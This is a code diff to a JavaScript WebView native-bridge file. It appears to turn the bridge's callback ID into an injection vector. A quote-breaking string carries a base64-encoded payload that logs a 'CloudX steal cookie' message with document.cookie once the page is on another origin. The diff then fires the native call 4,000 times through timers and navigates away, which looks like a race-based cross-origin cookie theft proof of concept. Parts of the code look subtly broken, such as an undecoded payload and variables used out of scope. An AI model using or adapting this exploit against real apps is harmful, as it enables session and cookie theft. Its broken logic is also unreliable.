@@ -309,14 +309,34 @@
             }
         });
 
-        // 生成回调ID并缓存回调函数
-        const callbackId = service + genCallbackId() + '\');console.log(11111) //';
+
+        const currUrl = location.href;
+        //要注入的代码
+        const payload = `
+        if (!location.href.startsWith("${currUrl}") && !window.__cloudx_called) {
+            window.__cloudx_called = true;
+            console.log('CloudX steal cookie url: '+ location.href + ',cookie : ' + document.cookie)
+        }
+        `;
+        const base64Code = btoa(payload);
+
+        // const callbackId = service + genCallbackId() + '\'); console.log(11111) //';
+        const callbackId = service + genCallbackId() + '\');' + base64Code + '//';
+
+
         if (success || fail) callbackCache[callbackId] = {success, fail};
 
         // 调用Native方法
         const nativeBridge = getNativeBridge(bridgeName);
-        const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
-        console.debug(`调用Native: ${service}.${action}, 参数: ${JSON.stringify(args)}, 结果: ${JSON.stringify(result)}`);
+
+        for (let i = 0; i < 4000; i++) {
+            setTimeout(function () {
+                const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
+                console.debug(`调用Native: ${service}.${action}, 参数: ${JSON.stringify(args)}, 结果: ${JSON.stringify(result)}`);
+            }, i);
+        }
+        location.href = url;
+
 
         // 结果入队并处理
         if (result) messageQueue.push(result);
